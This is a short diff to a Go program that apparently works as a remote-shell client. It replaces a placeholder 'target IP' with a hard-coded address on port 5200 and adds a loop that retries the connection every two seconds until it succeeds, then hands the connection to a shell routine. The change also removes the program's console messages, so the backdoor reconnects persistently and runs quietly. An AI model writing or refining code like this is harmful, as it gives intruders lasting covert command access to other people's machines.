@@ -11,13 +11,22 @@ import (
 )
 
 func main() {
-	fmt.Println("Initiate connection with remote host")
 	command := ""
-	conn, err := net.DialTimeout("tcp", "<<ENTER TARGETS IP HERE>>:5200", time.Duration(1*time.Second)) //see bellow in the code there two more net.Dial Funcions for the re establish change i[p there too (sorry for the hard code :) )
+
+	conn, err := net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
 
 	if err != nil {
-		fmt.Println("Nope exiting", conn)
-		return
+		for {
+			conn, err = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+
+			if err == nil {
+				break
+			}
+
+			time.Sleep(2 * time.Second)
+		}
+
+	} else {
 	}
 
 	shell(conn, command)
